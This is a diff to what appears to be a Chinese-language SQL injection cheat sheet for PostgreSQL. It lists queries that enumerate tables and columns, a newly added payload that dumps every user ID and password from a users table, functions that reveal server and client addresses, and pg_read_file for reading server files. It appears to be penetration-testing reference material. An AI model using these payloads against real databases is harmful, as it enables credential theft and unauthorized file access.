@@ -1129,13 +1129,22 @@ end
     - `SELECT tablename FROM pg_tables WHERE schemaname='dbname'`
 - 爆Column
     - `SELECT column_name FROM information_schema.columns WHERE table_name='admin'`
-
+- Dump all 
+    - `array_to_string(array(select userid||':'||password from users),',')`
 - 其它
     - version()
-    - current_database()
+    - current\_database()
     - user
         - current_user
         - `SELECT usename FROM pg_user;`
+    - current\_schema
+    - current\_query()
+    - inet\_server\_addr()
+    - inet\_server\_port()
+    - inet\_client\_addr()
+    - inet\_client\_port(
+    - type conversion
+        - `cast(count(*) as text)`
     - `md5('abc')`
     - `replace('abcdefabcdef', 'cd', 'XX')` => `abXXefabXXef`
     - `pg_read_file(filename, offset, length)`
